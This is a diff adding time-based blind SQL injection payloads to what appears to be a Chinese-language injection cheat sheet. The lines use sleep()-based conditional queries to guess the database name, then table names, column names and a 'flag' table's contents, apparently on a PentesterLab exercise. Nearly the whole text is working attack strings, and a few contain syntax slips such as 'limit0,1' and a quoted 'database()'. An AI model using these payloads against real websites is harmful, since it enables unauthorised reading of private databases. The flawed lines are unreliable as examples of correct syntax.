@@ -74,6 +74,16 @@ and ascii(substr((select table_name from information_schema.tables where table_s
 ord(mid((select user()),1,1))=114
 
 时间注入:
+?nav=26' and if(1=0,1, sleep(0)) --+
+if(length(database())=12,sleep(2),100)--+
+if(substring(database(),1,1)='p',111,sleep(3))--+
+3.  判断表名
+type=if(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1='a'),11111,sleep(1))--+
+ 4.    判断列名
+type=if(substring((select column_name from information_schema.columns where table_name='flag' and table_schema='database()' limit0,1),1,1='a'),11111,sleep(1))--+
+5.    判断具体字段内容
+type=if(substring((select flag from pentesterlab.flag limit 0,1),1,1='a'),sleep(3),111111) --+ 
+    
 ?id=1' and if(left(user(),1)='i',0,sleep(3))--+
 Id=1' and sleep(10)
 and if(length(database())=4 , sleep(3), 1) --+ 正确就延迟，错误就不延时
